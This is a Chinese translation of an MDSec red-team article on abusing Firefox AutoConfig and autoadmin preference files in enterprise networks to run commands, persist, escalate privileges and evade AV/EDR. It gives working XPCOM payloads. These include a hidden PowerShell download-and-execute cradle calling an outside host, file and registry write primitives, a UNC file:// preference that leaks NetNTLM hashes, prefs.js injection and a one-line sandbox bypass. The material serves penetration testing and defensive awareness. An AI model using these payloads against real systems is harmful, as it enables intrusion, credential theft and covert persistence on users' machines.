
# 如何在企业环境中滥用Firefox


                                阅读量   
                                **290983**
                            
                        |
                        
                                                                                                                                    ![](./img/203840/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者mdsec，文章来源：mdsec.co.uk
                                <br>原文地址：[https://www.mdsec.co.uk/2020/04/abusing-firefox-in-enterprise-environments/](https://www.mdsec.co.uk/2020/04/abusing-firefox-in-enterprise-environments/)

译文仅供参考，具体内容表达以及含义原文为准

[![](./img/203840/t01cdf0c90e58303dee.png)](./img/203840/t01cdf0c90e58303dee.png)



## 0x00 前言

在本文中，我们介绍了如何在企业环境中滥用Firefox功能实现命令执行。

在渗透测试及红队行动中，这些功能可以用于横向渗透、持久化以及防御规避。我们在最新版本的Firefox浏览器上测试所有场景。

涉及到的具体版本信息如下：

```
Firefox Browser 74.0 (64-bit);
Firefox Quantum ESR (Extended Support Release) 68.6.0esr (64-bit);
Nightly 76.0a1 (2020-03-20) (64-bit)
```

此次研究灵感来自于某次内部渗透测试，当时我们在活动目录（AD）组策略中找到了一个不安全的配置，SCCM（系统中心配置管理器）会将扩展名为`cfg`、`js`、`jsm`的多个文件部署到用户主机中。

比如，SCCM会将`autoconfig.js`文件部署到路径`C:\Program Files (x86)\Mozilla Firefox\defaults\pref\autoconfig.js`。

这里的安全问题在于，被攻击的域用户具备存放在GPO中文件的完整控制权限，而SCCM后续会将这些文件部署到相关主机的Mozilla Firefox安装目录中（即应用GPO的OU中的所有计算机对象）。

由于我们在其他企业环境中也见到过类似配置，因此我们决定继续研究，看能否利用这种配置，形成武器化技术。



## 0x01 管理Firefox

我们的研究起点是理解SCCM所部署的文件，我们发现这些文件由CCK2扩展所生成。

CCK2是有一定历史的Firefox扩展，曾在各种组织中广泛使用。这个扩展允许管理员生成自定义扩展，从而实现对浏览器的自定义。Firefox本来想通过GPO来替换这个功能，但该功能目前仍被广泛使用中。

管理员可以使用CCK2实现如下功能：
- 自定义浏览器设置（主页、代理等）；
- 禁用浏览器功能（比如匿名模式等）；
- 设置并锁定浏览器首选项（比如使用户无法修改代理设置）。
大家可以访问Firefox[官方](https://developer.mozilla.org/en-US/docs/Mozilla/Firefox/Enterprise_deployment_before_60)了解CCK2扩展。

CCK2会以扩展文件的形式生成扩展，这些文件随后会被部署到浏览器安装目录中。

由于CCK2是一个旧版扩展，因此在安装CCK2生成的扩展时存在一些限制：

1、CCK2 Wizard只适用于Firefox 56及以下版本：

2、需要在`about:config`中关闭附加组件签名（这个选项只有在Extended Support Release（ESR）、Developer Edition以及Nightly版本中可用）。

这些限制条件可以避免攻击者传播恶意浏览器扩展。由于存在这些限制，我们无法在默认的桌面版Firefox浏览器中安装未签名扩展。

然而在企业环境中，Firefox ESR是默认的浏览器版本，允许管理员禁用附加组件签名检查，以便在内部环境中将自定义扩展安装到员工浏览器中。

这意味着如果具备扩展文件的写权限，恶意攻击者就可以修改这些文件，有可能执行恶意代码。在生成的扩展文件中，有两个文件最为有趣：

```
autoconfig.js
mozilla.cfg
```

根据Firefox[官网](https://support.mozilla.org/en-US/kb/customizing-firefox-using-autoconfig)的描述：

> `AutoConfig`文件可以用来设置和锁定Windows组策略（或Mac、Linux上的`policies.json`）未覆盖到的选项。

这些文件的典型内容如下所示：

[![](./img/203840/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t017472cd72f6101c97.png)

[![](./img/203840/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t014f5f360de9df6c0d.png)

这些文件成对出现，存放在Firefox安装目录中。第一个文件为`autoconfig.js`，存放在`defaults/pref`目录，为首选项文件。该文件指定了`AutoConfig`文件的名称（这里为`mozilla.cfg`，但可以设定为任意值），然而我们无法修改`AutoConfig`文件的路径（该文件会被放在Firefox安装目录的最上层）。根据Firefox文档：

> 虽然`AutoConfig`文件扩展名通常为`.cfg`，但实际上是一个JavaScript文件，这样我们可以在该文件内写入其他JavaScript，以在不同情况下添加不同的逻辑。

Firefox文档中给出了一系列`AutoConfig`函数，这些函数在`AutoConfig`文件中可用，可以用来管理浏览器首选项：

```
pref(prefName, value)
defaultPref(prefName, value)
lockPref(prefName, value)
unlockPref(prefName)
getPref(prefName)
clearPref(prefName)
displayError(funcname, message)
getenv(name)
```

大家可以访问此处了解这些函数更多[细节](https://support.mozilla.org/en-US/kb/customizing-firefox-using-autoconfig)。

总而言之，Firefox中存在`AutoConfig`文件，当GPO无法满足更多需求时，管理员可以利用这些文件来管理浏览器首选项。

这里有2个JavaScript文件应当放在Firefox安装目录中，以便在Firefox下次启动时执行。由于我们的用户具备具备这些文件的写权限，因此我们开始研究如何滥用这些JavaScript文件。



## 0x02 Mozilla XPCOM

XPCOM是一个跨平台组件对象模型，与微软的COM类似。XPCOM绑定了多种语言，XPCOM组件可以通过JavaScript、Java、Python及C++来使用及实现。XPCOM之前在Firefox中被广泛使用，可以简化对操作系统功能的访问。

然而，从版本57开始，Firefox只支持使用`WebExtensions` API来开发扩展。Firefox称这是[XPCOM](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions)的安全替代方案。此外，Firefox还表示`addons.mozilla.org`上不再接受使用XPCOM的旧版插件。

攻击者对XPCOM的滥用可以追溯到多年以前。一开始攻击者会创建恶意扩展，这些扩展在安装时会执行远程访问木马（RAT），这也是Firefox决定迁移到`WebExtensions` API的主要原因之一。

此外，针对Firefox的各种漏洞利用技术中也会使用XPCOM，作为特权JavaScript上下文中的payload组件。我们可以在Metasploit中使用Firefox payload模块来生成最常用的payload。

然而，由于没有经常维护（某些接口和方法已经改动或被删除）、浏览器部署了其他防御机制（如沙箱）、容易被AV产品检测（比如Windows Defender会将其标识为`Exploit:JS/FFShellReverseTcp`），这些payload并不适用于现代版本的Firefox。

由于`AutoConfig`文件可以用来集中化管理浏览器首选项，因此在企业环境中颇受管理员欢迎。从我个人经验来看，这些文件经常比Firefox GPO功能还受欢迎，因为这些文件在部署方式及内容管理上更加直观。

因此，在内部架构中，我们可以看到管理员采用如下方式来实现组策略：

```
xCopy /Y “\\&lt;dc&gt;\\NETLOGON\msi\FirefoxPolicy\Mozilla\mozilla.cfg” “C:\Program Files\Mozilla Firefox”
```

本质上管理员都会采用类似脚本将`AutoConfig`文件部署到主机中。前面提到过，`AutoConfig`文件是JavaScript文件，由于这些文件在浏览器特权上下文中执行。可以访问XPCOM，因此攻击者可以使用`AutoConfig`文件中的XPCOM来实现命令执行。

然而在版本62之后，Firefox默认将`AutoConfig`放在沙箱中，避免攻击者使用危险的XPCOM功能。默认情况下。只有桌面版Firefox（我们尚未分析移动版）启用了沙箱，因此ESR及Nightly版中并没有沙箱化`AutoConfig`。Firefox对`AutoConfig`的处理过程在如下[代码](https://dxr.mozilla.org/mozilla-central/source/extensions/pref/autoconfig/src)中：

代码首先会在`nsReadConfig.cpp`的第135行设置`sandboxEnabled`变量：

[![](./img/203840/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0162afbb778423dd2c.png)

在ESR和Nightly版本中，这个值设置为`false`，因此这些版本默认情况下并没有沙箱化`AutoConfig`。由于ESR具备更多的配置功能，大多数企业环境会使用该版本，这也导致攻击者更容易使用本文描述的攻击。



## 0x03 准备恶意AutoConfig文件

默认配置中的恶意代码应当存放在`AutoConfig`文件中（如`mozilla.cfg`文件），放在Firefox安装目录中。首选项文件（`autoconfig.js`）应当放在`defaults/pref`目录中，在`AutoConfig`文件中引用。

`AutoConfig`文件使用的文件名可以在首选项文件中任意设置，然而我们不应当使用`dsengine.cfg`，这是Firefox源代码（`nsReadConfig.cpp`）中列入黑名单的一个名称。此外，根据Firefox[文档](https://developer.mozilla.org/en-US/docs/Mozilla/Firefox/Enterprise_deployment_before_60)描述，首选项文件的文件名也可以修改为任意值。

典型的`AutoConfig`文件如下所示，其中包含用来启动`calc.exe`的XPCOM：

```
// Any comment. You must start the file with a single-line comment!
defaultPref("browser.startup.homepage", "https://www.mdsec.co.uk/");
// Added malicious code starts here.
var proc = Components.classes["@mozilla.org/process/util;1"]
                       .createInstance(Components.interfaces.nsIProcess);
var file = Components.classes["@mozilla.org/file/local;1"]
                       .createInstance(Components.interfaces.nsIFile);    
file.initWithPath("C:\\Windows\\System32\\calc.exe");
proc.init(file);
var args = [""];
proc.run(false,args,args.length);
```

如果攻击者具备这些文件的“写”权限，如果存在不安全的GPO，那么攻击者就能修改合法文件，在应用了该GPO的用户主机上运行任意代码。

需要注意的是，有时候Firefox安装目录不在`Program Files`目录中（比如`D:\Mozilla Firefox`），如果没有针对非特权用户限制写权限，此时还会出现权限提升攻击场景。



## 0x04 危险操作原语

XPCOM提供了与底层操作系统配合使用的大量接口及类，因此我们可以通过各种方式实现命令执行。在下文中，我们将讨论如何组合某些原语实现命令执行。

### <a class="reference-link" name="%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"></a>命令执行

首先我们可以使用`nsIProcess`及`nsIFile`接口简单实现命令执行：

```
var proc = Components.classes["@mozilla.org/process/util;
                       .createInstance(Components.interfaces.nsIProcess);
var file = Components.classes["@mozilla.org/file/local;1"]
                       .createInstance(Components.interfaces.nsIFile);    
file.initWithPath("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
proc.init(file);
var args = ["-nop", "-w", "hidden", "-c", "$b=new-object net.webclient;IEX $b.downloadstring('http://192.168.56.101/test.ps1');"];
proc.run(false,args,args.length);

```

PowerShell会作为Firefox子进程来执行：

[![](./img/203840/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01fd4f445457a6ced2.png)

### <a class="reference-link" name="%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"></a>任意文件写入

我们可以使用`nsIFileOutputStream`接口将任意文本及二进制文件写入文件系统中：

```
function writeText(test_str, out_file) {
    var file = Components.classes["@mozilla.org/file/local;1"]
                    .createInstance(Components.interfaces.nsIFile);
    file.initWithPath(out_file);
    var outStream = Components.classes["@mozilla.org/network/file-output-stream;1"].createInstance(Components.interfaces.nsIFileOutputStream);
    outStream.init(file, 0x02 | 0x08 | 0x20, 0666, 0); 
    var converter = Components.classes["@mozilla.org/intl/converter-output-stream;1"].createInstance(Components.interfaces.nsIConverterOutputStream);
    converter.init(outStream, "UTF-8", 0, 0);
    converter.writeString(test_str);
    converter.close();
}

function writeBinary(out_file) {
    var file = Components.classes["@mozilla.org/file/local;1"]
                            .createInstance(Components.interfaces.nsIFile);
    file.initWithPath(out_file);
    var stream = Components.classes["@mozilla.org/network/safe-file-output-stream;1"].createInstance(Components.interfaces.nsIFileOutputStream);
    stream.init(file, 0x04 | 0x08 | 0x20, 0600, 0);                       
    var payload = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
    stream.write(payload, payload.length);
    if (stream instanceof Components.interfaces.nsISafeOutputStream) {
        stream.finish();
    } else {
        stream.close();
    }
}
```

### <a class="reference-link" name="%E5%86%99%E5%85%A5Windows%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AE%E5%80%BC"></a>写入Windows注册表键值

此外我们还可以使用`nsIWindowsRegKey`接口来处理Windows注册表。比如，我们将某个键值写入注册表中：

```
function registry_createKey(key_path) {
    var wrk = Components.classes["@mozilla.org/windows-registry-key;1"]
                    .createInstance(Components.interfaces.nsIWindowsRegKey);
    wrk.create(wrk.ROOT_KEY_CURRENT_USER, key_path, wrk.ACCESS_WRITE);
    wrk.close();
}
function registry_setKeyValue(value, data, type, key_path) {
    var wrk = Components.classes["@mozilla.org/windows-registry-key;1"]
                    .createInstance(Components.interfaces.nsIWindowsRegKey);
    wrk.open(wrk.ROOT_KEY_CURRENT_USER, key_path, wrk.ACCESS_WRITE);
    switch (type) {
        case "REG_SZ":
            wrk.writeStringValue(value, data);
            wrk.close();
            break;
        case "REG_DWORD":
            wrk.writeIntValue(value, data);
            wrk.close();
            break;
    }
}
```

这类XPCOM原语可以用来通过各种方式构造payload，规避AV/EDR产品对特定执行方式的监控。以上我们只给出了部分使用场景，大家可以参考[XPCOM文档](https://developer.mozilla.org/en-US/docs/Mozilla/Tech/XPCOM/Reference/Interface)了解更多接口，构造高级payload。

### <a class="reference-link" name="%E6%9B%B4%E5%A4%9AAutoConfig%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"></a>更多AutoConfig攻击方式

前面提到过，基本的`AutoConfig` paylaod可以用来完成如下任务：

1、如果`AutoConfig`文件被部署到Firefox安装目录中，可以用来实现远程命令执行；

2、如果Firefox安装目录具备写权限，可以实现权限提升；

3、如果Firefox安装目录具备写权限，可以实现持久化。

然而，当Firefox被安装到`Program Files`目录时，只有攻击者具备目标主机的管理员权限时才能实现持久化（我们希望具备用户态持久化能力）。从这一点着手，我们继续研究是否可以由其他入口点，可以用来触发XPCOM，通过普通用户权限来攻击。

Firefox可以将个人信息存放在一系列文件中，这些文件分开存放在Firefox安装目录中。Firefox首选项中包括各种信息，比如密码、书签、扩展项、用户设置等。Firefox可以使用多个首选项，通过`about:profiles`访问Firefox配置管理器来切换不同的配置。

在这些配置信息中，我们比较感兴趣的是默认存放在用户`AppData\Roaming\Mozilla\Firefox\Profiles\`目录中的如下配置。我们需要时刻记住的是，用户在管理自己的配置时，可以设置任意的配置目录。当我们通过浏览器界面将选项信息（如启动页面）保存到配置文件中时，这些信息会被保存到`prefs.js`中，文件内容如下所示：

[![](./img/203840/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01c6a5153b87e54dc5.png)

然而，该文件并不具备XPCOM的访问权限，因此我们无法在其中直接包含XPCOM代码。这是因为首选项文件使用特定的一组函数来执行，这些函数包含在[prefcalls.js](https://dxr.mozilla.org/mozilla-central/source/extensions/pref/autoconfig/src/prefcalls.js)中。

[![](./img/203840/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0165af696f338ea043.png)

但我们可以注意到其中包含如下注释：

> 如果想修改首选项值，我们也可以在`user.js`文件中进行设置。

根据官方文档，这个文件默认情况下并没有被创建，是“用户可以创建的可选文件，可以覆盖被其他首选项文件初始化过的选项值”。这个文件比较有趣的一点是，该文件优先级最高，高于首选项文件及`AutoConfig`文件，如下所示：

[![](./img/203840/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ceaaa8100bf0bbbd.png)

这意味着即使管理员将首选项文件及`AutoConfig`文件上传到Firefox安装目录，实现了某些浏览器设置，当前用户也可以通过写`user.js`文件来覆盖其他设置。然而，由于`user.js`是首选项文件，因此我们无法从该文件中执行XPCOM代码。

但这里我们可以使用`user.js`首选项文件，通过一些绕过方法实现任意命令执行。

这里最明显的一种方法，就是在`user.js`首选项文件中通过`general.config.filename`选项来引用`AutoConfig`文件。

[![](./img/203840/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01c8aee49179fc6459.png)

这种方法的缺陷在于，Firefox仍然会在安装目录中查找`AutoConfig`文件：

[![](./img/203840/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t014906f94fae673d7c.png)

Firefox不允许为`AutoConfig`文件设置任意的绝对路径值。

因此，即使攻击者可以通过用户配置目录的恶意`AutoConfig`文件来设置首选项，我们仍然需要将恶意`AutoConfig`文件注入到Firefox的安装目录中。

实现命令执行的第二种方法就是将附加外部托管的`autoadmin`文件，可以参考Firefox文档的如下描述：

> `AutoConfig`文件可以采用中心化管理方式。为了完成该任务，我们需要在主`AutoConfig`文件中引用辅助`AutoConfig`文件的位置：
<pre><code class="hljs cpp">pref(“autoadmin.global_config_url”,”http://yourdomain.com/autoconfigfile.js”);”
</code></pre>

在官方文档中，`AutoConfig`文件（使用`cfg`扩展名）和首选项文件（使用`js`扩展名）的区别不是特别清晰。然而我们要注意到，使用`autoadmin.global_config_url`选项时有些奇怪的特点：

1、我们可以使用任意URI（包括`file://`），这是Firefox支持的特性。因此，我们可以上传首选项文件，其中设置如下选项，从而窃取到NetNTLM哈希：

```
pref(“autoadmin.global_config_url”, “file://///10.0.2.15\test\ksek.js”);
```

[![](./img/203840/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0129a62286cfb995d0.png)

2、由`autoadmin.global_config_url`引用的外部`js`首选项文件（`autoadmin`文件）并没有在`prefcalls.js`导出的沙箱中执行。该文件在下载时，文件内容会被传递给`EvaluateAdminConfigScript()`函数（参考`nsAutoConfig.cpp`、`nsAutoConfig::OnStopRequest()`）。

[![](./img/203840/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016d13b9fd5e7eb631.png)

`EvaluateAdminConfigScript()`使用先前设置的`sandboxEnabled static bool`值来执行（参考`nsJSConfigTriggers.cpp`）。

[![](./img/203840/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01912d5cbe227a3568.png)

在Firefox ESR和Nightly中，`sandboxEnabled`在之前`autoconfig`文件处理过程中会被设置为`false`。因此，外部`autoadmin` `js`文件会在`autoconfigSystemSb` JavaScript上下文中执行，使得攻击者可以自由执行基于XPCOM的payload。

然而，如果希望基于`autoadmin.global_config_url`的技术正常工作，我们需要满足一个条件。Firefox在安装目录中至少应当已经有个`AutoConfig`文件，并且有个首选项文件引用了这个文件。文件内容无关紧要，在面对内部架构场景时，我们通常能满足这个条件（因为管理员很可能会将`AutoConfig`文件部署到安装目录）。

此外，当我们分析外部`autoadmin`文件的使用场景后，我们还可以找到其他入口点文件。首先，在下载完`autoadmin`文件并且该文件被成功执行后，文件内容会被拷贝到（用户配置目录的）`failover.jsc`文件中。在如下场景中，该文件会被当成`AutoConfig`文件来执行：

1、在解析下载的`autoconfig`文件时出现错误：

[![](./img/203840/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a33b372b38fdb74e.png)

2、请求远程`autoadmin`文件时失败：

[![](./img/203840/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0112578b3eac7c58b1.png)

3、当网络处于离线状态，且`autoadmin.offline_failover`选项被设置为`true`时：

[![](./img/203840/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01ae2af69d15e89768.png)

这样我们就可以构造出一些绕过场景。比如在第一阶段，恶意首选项文件使用`autoadmin` URI部署到用户主机中。在首次启动时，浏览器会下载并执行恶意payload，将恶意`autoadmin`文件拷贝到`failover.jsc`。随后，攻击者可以修改攻击者服务器上的`autoadmin`文件内容，将其改为合法但无效的内容。因此，Firefox在下次重启时，会尝试获取看上去合法的`autoadmin`文件，但由于该文件内容无效，因此浏览器会转而使用恶意的`failover.jsc`，而该文件先前已被保存到配置文件夹中。

其次，`autoadmin.global_config_preference`可以直接从`prefs.js`默认文件中设置。当浏览器使用`user.js`（或其他首选项文件）时，会处理文件中的首选项集合，将这些首选项拷贝到配置文件目录下的`prefs.js`文件中。因此，我们可以直接在`prefs.js`文件中添加引用恶意`autoadmin`文件的`autoadmin.global_config_url`选项。需要注意的是，`prefs.js`文件中会按字母顺序设置各个首选项，因此我们应当将`autoadmin`选项插入正确的位置，比如：

```
// DO NOT EDIT THIS FILE.
//
// If you make changes to this file while the application is running,
// the changes will be overwritten when the application exits.
//
// To change a preference value, you can either:
// - modify it via the UI (e.g. via about:config in the browser); or
// - set it within a user.js file in your profile.
[SNIP]
user_pref("app.update.lastUpdateTime.search-engine-update-timer", 1584442362);
user_pref("app.update.lastUpdateTime.services-settings-poll-changes", 1584443219);
user_pref("app.update.lastUpdateTime.telemetry_modules_ping", 1584442320);
user_pref("app.update.lastUpdateTime.xpi-signature-verification", 1584444609);
user_pref("app.update.migrated.updateDir2.308046B0AF4A39CB", true);
user_pref("autoadmin.global_config_url", "file://///10.0.2.6\\test\\autoadmins.js");
user_pref("browser.aboutConfig.showWarning", false);
user_pref("browser.bookmarks.restore_default_bookmarks", false);
[SNIP]
```

总结一下，在Firefox启动时，现在我们可以通过如下方式执行XPCOM payload：

1、在`defaults/pref`中使用恶意首选项文件以及在Firefox安装目录中使用恶意`AutoConfig`文件。

2、在Firefox配置文件目录中使用恶意首选项文件（`user.js`或`prefs.js`），其中引用`AutoConfig`文件，并且在Firefox安装目录中设置恶意`AutoConfig`文件。

3、在Firefox配置文件目录中使用恶意首选项文件（`user.js`或`prefs.js`），其中使用恶意的`autoadmin`文件URI。

4、在Firefox配置文件目录中使用恶意首选项文件（`user.js`或`prefs.js`），使用无效或者不可访问的`autoadmin`文件URI，同时在Firefox配置文件目录中将恶意`autoadmin`文件保存为`failover.jsc`。

这些方法可以为我们提供在用户模式下的持久化、权限提升（如果目标用户采用自定义用户配置文件目录，且攻击者具备改目录的写权限）以及远程命令执行（如果管理员将配置文件直接部署到用户配置目录中）方法。



## 0x05 启用沙箱的AutoConfig XPCOM

前面描述的命令执行方法默认情况并不适用于桌面版的Firefox，因为该版本中`sandboxEnabled`变量的值为`true`。然而，我们可以修改`general.config.sandbox_enabled`首选项，禁用改特性（参考`nsReadConfig.cpp`）：

[![](./img/203840/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t018025153145d34ffb.png)

当用户设置`sandboxEnabled`值后，该值会被传递给`CentralizedAdminPrefManagerInit()`函数：

[![](./img/203840/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0189dc131f370a8425.png)

`CentralizedAdminPrefManagerInit()`函数定义位于`nsJSConfigTriggers.cpp`中，该函数中会将`sandboxEnabled`变量的值设为传入的参数值。随后`EvaluateAdminConfigScript()`函数会使用该变量来在`autoconfigSystemSb`和`autoconfigSb`之间切换JavaScript上下文：

[![](./img/203840/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t017a737bc906abbe82.png)

因此，攻击者只需要在首选项文件中添加一行代码，就能在特权`autoconfigSystemSb`上下文中执行`AutoConfig`或`autoadmin`文件。

通过这种方式，如果攻击者在正在被使用的首选项文件中添加如下一行代码，前面描述的命令执行方法就可以适用于桌面版Firefox：

```
pref(“general.config.sandbox_enabled”, false);
```

这里有趣的是，我们也可以在用户的`prefs.js`中直接设置这个首选项。为了完成该任务，我们应该在文件末尾加入如下一行（配合之前设置的`AutoConfig`或者`autoadmin`文件URI）：

[![](./img/203840/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t011e82972e995ef796.png)

在第一次启动时，`autoconfig`或`autoadmin`文件中的XPCOM payload会在特权上下文中执行，然而`sandbox_enabled`首选项会自动从`prefs.js`中删除。因此在第二次运行时，由于JavaScript上下文不会切换，因此payload不会被执行。由于该功能会自动删除恶意的`sandbox_enabled`首选项，因此可以适用于一次性执行方案。
